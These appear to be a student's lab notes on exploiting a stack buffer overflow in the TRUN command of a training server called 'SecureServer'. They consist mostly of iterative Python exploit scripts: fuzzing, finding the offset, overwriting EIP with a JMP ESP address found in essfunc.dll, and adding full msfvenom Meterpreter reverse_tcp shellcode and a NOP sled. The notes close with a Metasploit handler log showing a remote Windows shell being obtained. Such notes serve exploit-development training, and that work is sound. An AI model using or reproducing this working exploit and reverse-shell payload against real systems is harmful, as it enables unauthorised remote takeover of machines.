remote vs local

 1 import socket
  2 
  3 buf = "TRUN /.:/"
  4 buf += "A" * 5000
  5 
  6 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  7 
  8 s.connect(('10.50.23.152', 9999))                                                        
  9 
 10 print s.recv(1024)
 11 
 12 s.send(buf)
 13 
 14 s.close()


s.connect takes a tuple as a string, port as integer

immunity
play button

find the offset



  1 import socket                                                                         
  2 
  3 buf = "TRUN /.:/"
  4 
  5 buf += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk"
  6
  8 
  9 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 10 
 11 s.connect(('10.50.23.24', 9999))
 12 
 13 print s.recv(1024)
 14 
 15 s.send(buf)
 16 
 17 s.close()





EIP value to get 2003

put in the B's to test

look for 42424242 in the EIP




  1 import socket                                                                         
  2 
  3 buf = "TRUN /.:/"
  4 
  5 buf += "A" * 2003
  6 
  7 buf += "B" * 4
  8 
  9 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 10 
 11 s.connect(('10.50.23.24', 9999))
 12 
 13 print s.recv(1024)
 14 
 15 s.send(buf)
 16 
 17 s.close()
 
 
 
 student@lin-ops:~/Downloads/winexploit$ vim exploit.py
student@lin-ops:~/Downloads/winexploit$ ls
exploit.py
student@lin-ops:~/Downloads/winexploit$ python exploit.py 
Welcome to SecureServer! Enter HELP for help.

student@lin-ops:~/Downloads/winexploit$ vim exploit.py
student@lin-ops:~/Downloads/winexploit$ vim exploit.py
student@lin-ops:~/Downloads/winexploit$ nano exploit.py 
student@lin-ops:~/Downloads/winexploit$ vim exploit.py
student@lin-ops:~/Downloads/winexploit$ nano exploit.py 
student@lin-ops:~/Downloads/winexploit$ python exploit.py 
Traceback (most recent call last):
  File "exploit.py", line 9, in <module>
    s.connect(('10.50.23.24', 9999))
  File "/usr/lib/python2.7/socket.py", line 228, in meth
    return getattr(self._sock,name)(*args)
socket.error: [Errno 111] Connection refused
student@lin-ops:~/Downloads/winexploit$ vim exploit.py
student@lin-ops:~/Downloads/winexploit$ python exploit.py 
Traceback (most recent call last):
  File "exploit.py", line 8, in <module>
    s.connect(('10.50.23.24', 9999))
  File "/usr/lib/python2.7/socket.py", line 228, in meth
    return getattr(self._sock,name)(*args)
socket.error: [Errno 111] Connection refused
student@lin-ops:~/Downloads/winexploit$ python exploit.py 
Welcome to SecureServer! Enter HELP for help.

student@lin-ops:~/Downloads/winexploit$ vim exploit.py
student@lin-ops:~/Downloads/winexploit$ python exploit.py 
Welcome to SecureServer! Enter HELP for help.

student@lin-ops:~/Downloads/winexploit$ vim exploit.py
student@lin-ops:~/Downloads/winexploit$ 






crash the program again, then search on 

!mona jmp -r ESP -m “essfunc.dll”

Log data, item 11
 Address=625012A0
 Message=  0x625012a0 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\student\Desktop\longtermstorage\essfunc.dll)


use that hex addess and reverse it

  1 import socket                                                                         
  2 
  3 buf = "TRUN /.:/"
  4 
  5 buf += "A" * 2003
  6 
  7 '''0x62 50 12 a0'''
  8 buf += "\xa0\x12\x50\x62"
  9 
 10 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 11 
 12 s.connect(('10.50.23.24', 9999))
 13 
 14 print s.recv(1024)
 15 
 16 s.send(buf)
 17 
 18 s.close()
~                  



generate the shell code

msfvenom -p windows/meterpreter/reverse_tcp lhost= 10.50.26.146 lport=8888 -b '\x00' -f python


student@lin-ops:~/Downloads/winexploit$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.26.146 lport=8888 -b '\x00' -f python
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of python file: 1865 bytes
buf =  b""   **DONT COPY THIS LINE**
buf += b"\xdd\xc6\xbb\x10\xcd\x0e\x2d\xd9\x74\x24\xf4\x5f\x33"
buf += b"\xc9\xb1\x59\x31\x5f\x19\x83\xef\xfc\x03\x5f\x15\xf2"
buf += b"\x38\xf2\xc5\x7d\xc2\x0b\x16\xe1\xf2\xd9\x72\x6a\xa6"
buf += b"\xed\xf1\x3e\x4b\x87\xe3\x35\x01\x83\xe4\xfe\xec\x8d"
buf += b"\xcb\xff\x7a\xa3\x03\xce\xbc\xe8\x68\x51\x41\xf3\xbc"
buf += b"\xb1\x78\x3c\xb1\xb0\xbd\x8a\xbf\x5d\x13\x86\x12\xb1"
buf += b"\x1f\xda\xae\xe6\x1e\x0b\x45\x48\x59\x2e\x9a\x3c\xd5"
buf += b"\x31\xcb\x37\xad\x29\xbb\xcc\x76\x6a\x3a\x01\x03\xa3"
buf += b"\x48\x99\x3d\xcb\xf8\x6a\x09\xb8\xfa\xba\x43\x7e\x50"
buf += b"\x83\x6b\x73\xa8\xc4\x4c\x6c\xdf\x3e\xaf\x11\xd8\x85"
buf += b"\xcd\xcd\x6d\x19\x75\x85\xd6\xfd\x87\x4a\x80\x76\x8b"
buf += b"\x27\xc6\xd0\x88\xb6\x0b\x6b\xb4\x33\xaa\xbb\x3c\x07"
buf += b"\x89\x1f\x64\xd3\xb0\x06\xc0\xb2\xcd\x58\xac\x6b\x68"
buf += b"\x13\x5f\x7d\x0c\xdc\x9f\x82\x50\x4a\x53\x4f\x6b\x8a"
buf += b"\xfb\xd8\x18\xb8\xa4\x72\xb7\xf0\x2d\x5d\x40\x81\x3a"
buf += b"\x5e\x9e\x29\x2a\xa0\x1f\x49\x62\x67\x4b\x19\x1c\x4e"
buf += b"\xf4\xf2\xdc\x6f\x21\x6e\xd7\xe7\xc0\x5c\xfd\x65\xbc"
buf += b"\xa2\x01\xa8\x85\x2b\xe7\xfc\xa5\x7b\xb8\xbc\x15\x3b"
buf += b"\x68\x55\x7c\xb4\x57\x45\x7f\x1f\xf0\xec\x90\xc9\xa8"
buf += b"\x98\x09\x50\x22\x38\xd5\x4f\x4e\x7a\x5d\x65\xae\x35"
buf += b"\x96\x0c\xbc\x22\xc1\xee\x3c\xb3\x64\xee\x56\xb7\x2e"
buf += b"\xb9\xce\xb5\x17\x8d\x50\x45\x72\x8e\x97\xb9\x03\xa6"
buf += b"\xec\x8c\x91\x86\x9a\xf0\x75\x06\x5b\xa7\x1f\x06\x33"
buf += b"\x1f\x44\x55\x26\x60\x51\xca\xfb\xf5\x5a\xba\xa8\x5e"
buf += b"\x33\x40\x96\xa9\x9c\xbb\xfd\xa9\xdb\x43\x83\x85\x43"
buf += b"\x2b\x7b\x96\x73\xab\x11\x16\x24\xc3\xee\x39\xcb\x23"
buf += b"\x0e\x90\x84\x2b\x85\x75\x66\xca\x9a\x5f\x26\x52\x9a"
buf += b"\x6c\xf3\x65\xe1\x1d\x04\x86\x16\x34\x61\x87\x16\x38"
buf += b"\x97\xb4\xc0\x01\xed\xfb\xd0\x35\xfe\x4e\x74\x1f\x95"
buf += b"\xb0\x2a\x5f\xbc"





1 import socket                                                                                              
  2 
  3 buf = "TRUN /.:/"
  4 
  5 buf += "A" * 2003
  6 
  7 '''0x62 50 12 a0'''
  8 buf += "\xa0\x12\x50\x62"
  9 buf += b"\xdd\xc6\xbb\x10\xcd\x0e\x2d\xd9\x74\x24\xf4\x5f\x33"
 10 buf += b"\xc9\xb1\x59\x31\x5f\x19\x83\xef\xfc\x03\x5f\x15\xf2"
 11 buf += b"\x38\xf2\xc5\x7d\xc2\x0b\x16\xe1\xf2\xd9\x72\x6a\xa6"
 12 buf += b"\xed\xf1\x3e\x4b\x87\xe3\x35\x01\x83\xe4\xfe\xec\x8d"
 13 buf += b"\xcb\xff\x7a\xa3\x03\xce\xbc\xe8\x68\x51\x41\xf3\xbc"
 14 buf += b"\xb1\x78\x3c\xb1\xb0\xbd\x8a\xbf\x5d\x13\x86\x12\xb1"
 15 buf += b"\x1f\xda\xae\xe6\x1e\x0b\x45\x48\x59\x2e\x9a\x3c\xd5"
 16 buf += b"\x31\xcb\x37\xad\x29\xbb\xcc\x76\x6a\x3a\x01\x03\xa3"
 17 buf += b"\x48\x99\x3d\xcb\xf8\x6a\x09\xb8\xfa\xba\x43\x7e\x50"
 18 buf += b"\x83\x6b\x73\xa8\xc4\x4c\x6c\xdf\x3e\xaf\x11\xd8\x85"
 19 buf += b"\xcd\xcd\x6d\x19\x75\x85\xd6\xfd\x87\x4a\x80\x76\x8b"
 20 buf += b"\x27\xc6\xd0\x88\xb6\x0b\x6b\xb4\x33\xaa\xbb\x3c\x07"
 21 buf += b"\x89\x1f\x64\xd3\xb0\x06\xc0\xb2\xcd\x58\xac\x6b\x68"
 22 buf += b"\x13\x5f\x7d\x0c\xdc\x9f\x82\x50\x4a\x53\x4f\x6b\x8a"
 23 buf += b"\xfb\xd8\x18\xb8\xa4\x72\xb7\xf0\x2d\x5d\x40\x81\x3a"
 24 buf += b"\x5e\x9e\x29\x2a\xa0\x1f\x49\x62\x67\x4b\x19\x1c\x4e"
 25 buf += b"\xf4\xf2\xdc\x6f\x21\x6e\xd7\xe7\xc0\x5c\xfd\x65\xbc"
 26 buf += b"\xa2\x01\xa8\x85\x2b\xe7\xfc\xa5\x7b\xb8\xbc\x15\x3b"
 27 buf += b"\x68\x55\x7c\xb4\x57\x45\x7f\x1f\xf0\xec\x90\xc9\xa8"
 28 buf += b"\x98\x09\x50\x22\x38\xd5\x4f\x4e\x7a\x5d\x65\xae\x35"
 29 buf += b"\x96\x0c\xbc\x22\xc1\xee\x3c\xb3\x64\xee\x56\xb7\x2e"
 30 buf += b"\xb9\xce\xb5\x17\x8d\x50\x45\x72\x8e\x97\xb9\x03\xa6"
 31 buf += b"\xec\x8c\x91\x86\x9a\xf0\x75\x06\x5b\xa7\x1f\x06\x33"
 32 buf += b"\x1f\x44\x55\x26\x60\x51\xca\xfb\xf5\x5a\xba\xa8\x5e"
 33 buf += b"\x33\x40\x96\xa9\x9c\xbb\xfd\xa9\xdb\x43\x83\x85\x43"
 34 buf += b"\x2b\x7b\x96\x73\xab\x11\x16\x24\xc3\xee\x39\xcb\x23"
 35 buf += b"\x0e\x90\x84\x2b\x85\x75\x66\xca\x9a\x5f\x26\x52\x9a"
 36 buf += b"\x6c\xf3\x65\xe1\x1d\x04\x86\x16\x34\x61\x87\x16\x38"
 37 buf += b"\x97\xb4\xc0\x01\xed\xfb\xd0\x35\xfe\x4e\x74\x1f\x95"
 38 buf += b"\xb0\x2a\x5f\xbc"
 39 
 40 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 41 
 42 s.connect(('10.50.23.24', 9999))
 43 
 44 print s.recv(1024)
 45 
 46 s.send(buf)
 47 
 48 s.close()
~                  




***THEN ADD THE NOOP SLED***

  1 import socket
  2 
  3 buf = "TRUN /.:/"
  4 
  5 buf += "A" * 2003
  6                                                                                                            
  7 '''0x62 50 12 a0'''
  8 buf += "\xa0\x12\x50\x62"
  9 
 10 buf += "\x90" * 10
 11 
 12 buf += b"\xdd\xc6\xbb\x10\xcd\x0e\x2d\xd9\x74\x24\xf4\x5f\x33"
 13 buf += b"\xc9\xb1\x59\x31\x5f\x19\x83\xef\xfc\x03\x5f\x15\xf2"
 14 buf += b"\x38\xf2\xc5\x7d\xc2\x0b\x16\xe1\xf2\xd9\x72\x6a\xa6"
 15 buf += b"\xed\xf1\x3e\x4b\x87\xe3\x35\x01\x83\xe4\xfe\xec\x8d"
 16 buf += b"\xcb\xff\x7a\xa3\x03\xce\xbc\xe8\x68\x51\x41\xf3\xbc"
 17 buf += b"\xb1\x78\x3c\xb1\xb0\xbd\x8a\xbf\x5d\x13\x86\x12\xb1"
 18 buf += b"\x1f\xda\xae\xe6\x1e\x0b\x45\x48\x59\x2e\x9a\x3c\xd5"
 19 buf += b"\x31\xcb\x37\xad\x29\xbb\xcc\x76\x6a\x3a\x01\x03\xa3"
 20 buf += b"\x48\x99\x3d\xcb\xf8\x6a\x09\xb8\xfa\xba\x43\x7e\x50"
 21 buf += b"\x83\x6b\x73\xa8\xc4\x4c\x6c\xdf\x3e\xaf\x11\xd8\x85"
 22 buf += b"\xcd\xcd\x6d\x19\x75\x85\xd6\xfd\x87\x4a\x80\x76\x8b"
 23 buf += b"\x27\xc6\xd0\x88\xb6\x0b\x6b\xb4\x33\xaa\xbb\x3c\x07"
 24 buf += b"\x89\x1f\x64\xd3\xb0\x06\xc0\xb2\xcd\x58\xac\x6b\x68"
 25 buf += b"\x13\x5f\x7d\x0c\xdc\x9f\x82\x50\x4a\x53\x4f\x6b\x8a"
 26 buf += b"\xfb\xd8\x18\xb8\xa4\x72\xb7\xf0\x2d\x5d\x40\x81\x3a"
 27 buf += b"\x5e\x9e\x29\x2a\xa0\x1f\x49\x62\x67\x4b\x19\x1c\x4e"
 28 buf += b"\xf4\xf2\xdc\x6f\x21\x6e\xd7\xe7\xc0\x5c\xfd\x65\xbc"
 29 buf += b"\xa2\x01\xa8\x85\x2b\xe7\xfc\xa5\x7b\xb8\xbc\x15\x3b"
 30 buf += b"\x68\x55\x7c\xb4\x57\x45\x7f\x1f\xf0\xec\x90\xc9\xa8"
 31 buf += b"\x98\x09\x50\x22\x38\xd5\x4f\x4e\x7a\x5d\x65\xae\x35"
 32 buf += b"\x96\x0c\xbc\x22\xc1\xee\x3c\xb3\x64\xee\x56\xb7\x2e"
 33 buf += b"\xb9\xce\xb5\x17\x8d\x50\x45\x72\x8e\x97\xb9\x03\xa6"
 34 buf += b"\xec\x8c\x91\x86\x9a\xf0\x75\x06\x5b\xa7\x1f\x06\x33"
 35 buf += b"\x1f\x44\x55\x26\x60\x51\xca\xfb\xf5\x5a\xba\xa8\x5e"
 36 buf += b"\x33\x40\x96\xa9\x9c\xbb\xfd\xa9\xdb\x43\x83\x85\x43"
 37 buf += b"\x2b\x7b\x96\x73\xab\x11\x16\x24\xc3\xee\x39\xcb\x23"
 38 buf += b"\x0e\x90\x84\x2b\x85\x75\x66\xca\x9a\x5f\x26\x52\x9a"
 39 buf += b"\x6c\xf3\x65\xe1\x1d\x04\x86\x16\x34\x61\x87\x16\x38"
 40 buf += b"\x97\xb4\xc0\x01\xed\xfb\xd0\x35\xfe\x4e\x74\x1f\x95"
 41 buf += b"\xb0\x2a\x5f\xbc"
 42 
 43 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 44 
 45 s.connect(('10.50.23.24', 9999))
 print s.recv(1024)
 48 
 49 s.send(buf)
 50 
 51 s.close()  
 
 
 
 
 msfconsole
 
 use multi/handler
 
 
 msfconsole
 show options
 set payload windows/meterpreter/reverse_tcp
 msf6 exploit(multi/handler) > set lport 8888
lport => 8888
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > show options
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8888
 





now run the exploitable back in the windows ops station without the debugger

have the listerner on
run on windows ops station
run the exploit




try again
double your noops sled
new shell code


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8888 
[*] Sending stage (175174 bytes) to 10.50.23.24
[*] Meterpreter session 2 opened (192.168.65.20:8888 -> 10.50.23.24:2506 ) at 2022-07-08 13:38:07 +0000

meterpreter > shell
Process 5432 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19044.1766]
(c) Microsoft Corporation. All rights reserved.

C:\Users\student\Desktop\longtermstorage>
